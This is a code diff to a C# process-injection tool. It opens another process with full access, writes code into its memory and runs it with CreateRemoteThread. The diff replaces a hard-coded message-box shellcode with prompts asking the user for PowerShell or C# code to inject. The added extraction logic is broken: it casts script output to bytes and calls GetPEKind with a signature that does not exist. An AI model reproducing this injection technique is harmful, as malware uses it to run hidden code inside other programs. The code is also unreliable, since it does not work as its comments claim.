@@ -1,6 +1,10 @@
 using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
+using System.CodeDom.Compiler;
+using System.IO;
+using System.Reflection;
+using System.Management.Automation;
 
 namespace ProcessInjection
 {
@@ -18,6 +22,12 @@ namespace ProcessInjection
 
         [DllImport("kernel32.dll")]
         static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool CloseHandle(IntPtr hObject);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
 
         // Define the constants
         const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
@@ -45,42 +55,63 @@ namespace ProcessInjection
             // Get a handle to the target process
             IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, processId);
 
-            // Define the shellcode to inject
-            // This shellcode will pop up a message box with the text "Hello from injected code!"
-            byte[] shellcode = new byte[193] {
-                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc8,0x00,0x00,0x00,0x41,0x51,
-                0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,
-                0x60 ,  00 ,  00 ,  00 ,  00 ,  00 ,  00 ,  00 , 
-                // The address of LoadLibraryA will be patched here
-                // by the injector program
-                // mov r10,<LoadLibraryA address>
-                // mov rax,[r10]
-                // mov [rax],rcx
-                // call qword ptr [rax]
-                // pop rdx
-                // pop rcx
-                // pop r10
-                // pop r11
+            // Ask the user to input the language (PowerShell or C#)
+            Console.WriteLine("Enter the language to use (PowerShell or C#):");
+            string language = Console.ReadLine().ToLower();
 
-                // The address of MessageBoxA will be patched here
-                // by the injector program
-                // mov r10,<MessageBoxA address>
-                // mov rax,[r10]
-                // mov [rax],rcx
-                // call qword ptr [rax]
-                // pop rdx
-                // pop rcx
-                // pop r10
-                // pop r11
+            byte[] shellcode = null;
 
-                // Exit the thread
-                // xor rcx , rcx 
-                // mov r10,<ExitThread address>
-                 // mov rax,[r10]
-                // mov [rax],rcx
-                // call qword ptr [rax]
+            if (language == "powershell")
+            {
+                // Ask the user to input the PowerShell code
+                Console.WriteLine("Enter the PowerShell code to inject:");
+                string userCode = Console.ReadLine();
 
-            };
+                // Convert the PowerShell code to a script block
+                var scriptBlock = ScriptBlock.Create(userCode);
+
+                // Invoke the script block and retrieve the output
+                shellcode = scriptBlock.Invoke() as byte[];
+            }
+            else if (language == "c#")
+            {
+                // Ask the user to input the C# code
+                Console.WriteLine("Enter the C# code to inject:");
+                string userCode = Console.ReadLine();
+
+                // Compile the user-input C# code to a DLL
+                CompilerResults results;
+                using (var provider = new CSharpCodeProvider())
+                               {
+                    var compilerParams = new CompilerParameters
+                    {
+                        GenerateInMemory = true,
+                        GenerateExecutable = false
+                    };
+                    results = provider.CompileAssemblyFromSource(compilerParams, userCode);
+                }
+
+                if (results.Errors.HasErrors)
+                {
+                    Console.WriteLine("Compilation failed:");
+                    foreach (CompilerError error in results.Errors)
+                    {
+                        Console.WriteLine("{0} - Line {1}: {2}", error.ErrorNumber, error.Line, error.ErrorText);
+                    }
+                    return;
+                }
+
+                // Load the compiled assembly and extract the shellcode
+                using (MemoryStream ms = new MemoryStream())
+                {
+                    results.CompiledAssembly.GetModules()[0].GetPEKind(out _, out var _, out var _, out var _, out var _, out var _, out var _, out shellcode);
+                }
+            }
+            else
+            {
+                Console.WriteLine("Invalid language. Please enter 'PowerShell' or 'C#'.");
+                return;
+            }
 
             // Allocate memory in the target process for the shellcode
             IntPtr pShellcode = VirtualAllocEx(hProcess,
@@ -95,38 +126,6 @@ namespace ProcessInjection
                                pShellcode,
                                shellcode,
                                (uint)shellcode.Length,
-                               out bytesWritten);
-
-            // Patch the shellcode with the addresses of the Win32 API functions
-            // You can use GetProcAddress to get these addresses dynamically
-            // For simplicity, I will use hard-coded addresses from my system
-            // These addresses may vary depending on the system and the DLL versions
-            // Use a debugger or a tool like Process Hacker to find the right addresses
-
-            // The address of LoadLibraryA in kernel32.dll
-            byte[] loadLibraryAddr = BitConverter.GetBytes(0x7ffed39e18f0);
-            // The address of MessageBoxA in user32.dll
-            byte[] messageBoxAddr = BitConverter.GetBytes(0x7ffed3b2e920);
-            // The address of ExitThread in kernel32.dll
-            byte[] exitThreadAddr = BitConverter.GetBytes(0x7ffed39f3b30);
-
-            // Write the addresses into the shellcode
-            WriteProcessMemory(hProcess,
-                               pShellcode + 0x24,
-                               loadLibraryAddr,
-                               (uint)loadLibraryAddr.Length,
-                               out bytesWritten);
-
-            WriteProcessMemory(hProcess,
-                               pShellcode + 0x2c,
-                               messageBoxAddr,
-                               (uint)messageBoxAddr.Length,
-                               out bytesWritten);
-
-            WriteProcessMemory(hProcess,
-                               pShellcode + 0x34,
-                               exitThreadAddr,
-                               (uint)exitThreadAddr.Length,
                                out bytesWritten);
 
             // Create a remote thread in the target process to execute the shellcode
